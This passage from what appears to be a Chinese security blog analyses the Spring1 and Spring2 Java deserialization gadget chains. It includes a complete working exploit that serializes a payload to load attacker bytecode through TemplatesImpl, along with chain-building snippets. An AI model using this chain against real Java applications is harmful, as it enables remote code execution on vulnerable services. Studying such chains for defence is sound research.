Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>      <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>      advisedSupport.setTarget(templates);<br>      Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>      Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br>      <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>      <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法        </span><br><span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>              Templates.class&#125;, AopInvocationHandler);<br><br>      HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>      Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>      <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>      Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>      Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="1701795213210-9ace4276-f84e-42c5-8c80-a4912c68cbad.png" alt="img"></p><p>运行没有问题。</p><p>由于需要反序列化触发。</p><p>所以MethodInvokeTypeProvider初始化时Method随便传一个，然后通过反射修改回newTransfrom。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="0x05-完整利用链"><a href="#0x05-完整利用链" class="headerlink" title="0x05 完整利用链"></a>0x05 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AopProxy;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetByteCodes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>                Templates.class&#125;, AopInvocationHandler);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>        setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-链接"><a href="#0x06-链接" class="headerlink" title="0x06 链接"></a>0x06 链接</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring2">https://su18.org/post/ysoserial-su18-3/#spring2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring1-gadget</title>
    <link href="/2023/12/14/spring1-gadget/"/>
    <url>/2023/12/14/spring1-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-beans : 4.1.4.RELEASE<br>jdk 1.7</p><h2 id="0x01-动态代理-Proxy-java"><a href="#0x01-动态代理-Proxy-java" class="headerlink" title="0x01 动态代理 Proxy.java"></a>0x01 动态代理 Proxy.java</h2><p>JDK提供的一个Proxy.newProxyInstance()创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><p>java&#x2F;lang&#x2F;reflect&#x2F;Proxy.java</p><p><img src="1700936771829-9603e802-5f80-4c2a-a549-6a495be25c56.png" alt="img"></p><p>三个参数分别是ClassLoader, 要代理的interfaces，和调用的invocationHandler。</p><p>代理后，使用interfaces里面的方法时，会自动调用传入invocationHandler.invoke()方法。相当于在不动源代码的情况下，通过invocationHandler.invoke对原方法的增强。</p><p>知道这点就够了。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><p>只能说是无敌。</p><h2 id="0x03-MethodInvokeTypeProvider"><a href="#0x03-MethodInvokeTypeProvider" class="headerlink" title="0x03 MethodInvokeTypeProvider"></a>0x03 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x04-TypeProvider"><a href="#0x04-TypeProvider" class="headerlink" title="0x04 TypeProvider"></a>0x04 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93.png" alt="img"></p><p>这里报错，抛出了类型转换错误，TemplatesImpl不能转化为Type类型。那怎么办了？</p><h2 id="0x05-ObjectFactoryDelegatingInvocationHandler"><a href="#0x05-ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="0x05 ObjectFactoryDelegatingInvocationHandler"></a>0x05 ObjectFactoryDelegatingInvocationHandler</h2><p>springframework里面有一个InvocationHandler类。</p><p>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</p><p>构造函数</p><p><img src="1700941320414-0f3be55f-e87a-4f1e-8409-882c75dd6087.png" alt="img"></p><p>objectFactory可控</p><p>invoke方法</p><p><img src="1700941969065-26eddd30-708a-45ff-900b-a3c9ec5bfa21.png" alt="img"></p><p>所以要找一个接口里面有toString或者getObject方法（理论上）。</p><p>这条链子找的是getObject。</p><p><img src="1700942103288-1f40556d-c9ad-47d5-8750-e6bbd8a6e168.png" alt="img"></p><p>然后在ObjectFactoryDelegatingInvocationHandler.invoke，可以结合AnnotationInvocationHandler返回TemplatesImpl。</p><p>对应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, ofdHandler);<br><span class="hljs-comment">//        System.out.println(typeProviderProxy);</span><br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 